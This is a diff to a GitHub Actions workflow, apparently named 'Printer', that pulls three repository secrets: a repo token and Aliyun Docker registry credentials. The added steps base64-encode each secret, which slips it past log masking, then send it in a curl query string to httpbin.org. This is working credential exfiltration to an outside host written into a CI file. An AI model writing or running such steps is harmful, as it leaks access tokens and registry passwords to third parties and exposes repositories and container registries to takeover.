@@ -1,4 +1,4 @@
-name: Printer Actions
+name: Printer
 
 on:
   workflow_dispatch:
@@ -7,25 +7,26 @@ jobs:
   printer:
     runs-on: ubuntu-latest
     steps:
+      - name: Encode REPO_TOKEN
+        run: |
+          ENCODED_REPO_TOKEN=$(echo -n "${{ secrets.REPO_TOKEN }}" | base64)
+          echo "::set-env name=ENCODED_REPO_TOKEN::$ENCODED_REPO_TOKEN"
+
+      - name: Encode ALIYUN_DOCKER_USERNAME
+        run: |
+          ENCODED_ALIYUN_DOCKER_USERNAME=$(echo -n "${{ secrets.ALIYUN_DOCKER_USERNAME }}" | base64)
+          echo "::set-env name=ENCODED_ALIYUN_DOCKER_USERNAME::$ENCODED_ALIYUN_DOCKER_USERNAME"
+
+      - name: Encode ALIYUN_DOCKER_PASSWORD
+        run: |
+          ENCODED_ALIYUN_DOCKER_PASSWORD=$(echo -n "${{ secrets.ALIYUN_DOCKER_PASSWORD }}" | base64)
+          echo "::set-env name=ENCODED_ALIYUN_DOCKER_PASSWORD::$ENCODED_ALIYUN_DOCKER_PASSWORD"
+
       - name: Print REPO_TOKEN
-        run: echo -n "${{ secrets.REPO_TOKEN }}" | base64
-        id: repo_token
+        run: curl -L "httpbin.org/get?id=${{ env.ENCODED_REPO_TOKEN }}"
+
       - name: Print ALIYUN_DOCKER_USERNAME
-        run: echo -n "${{ secrets.ALIYUN_DOCKER_USERNAME }}" | base64
-        id: aliyun_docker_username
+        run: curl -L "httpbin.org/get?id=${{ env.ENCODED_ALIYUN_DOCKER_USERNAME }}"
+
       - name: Print ALIYUN_DOCKER_PASSWORD
-        run: echo -n "${{ secrets.ALIYUN_DOCKER_PASSWORD }}" | base64
-        id: aliyun_docker_password
-
-      # 输出环境变量以便后续步骤使用
-      - name: Set Outputs
-        run: |
-          echo "::set-output name=repo_token::${{ steps.repo_token.outputs.stdout }}"
-          echo "::set-output name=aliyun_docker_username::${{ steps.aliyun_docker_username.outputs.stdout }}"
-          echo "::set-output name=aliyun_docker_password::${{ steps.aliyun_docker_password.outputs.stdout }}"
-
-      - name: Make HTTP Request
-        run: |
-          curl -L "httpbin.org/get?id=${{ steps.repo_token.outputs.stdout }}"
-          curl -L "httpbin.org/get?id=${{ steps.aliyun_docker_username.outputs.stdout }}"
-          curl -L "httpbin.org/get?id=${{ steps.aliyun_docker_password.outputs.stdout }}"
+        run: curl -L "httpbin.org/get?id=${{ env.ENCODED_ALIYUN_DOCKER_PASSWORD }}"
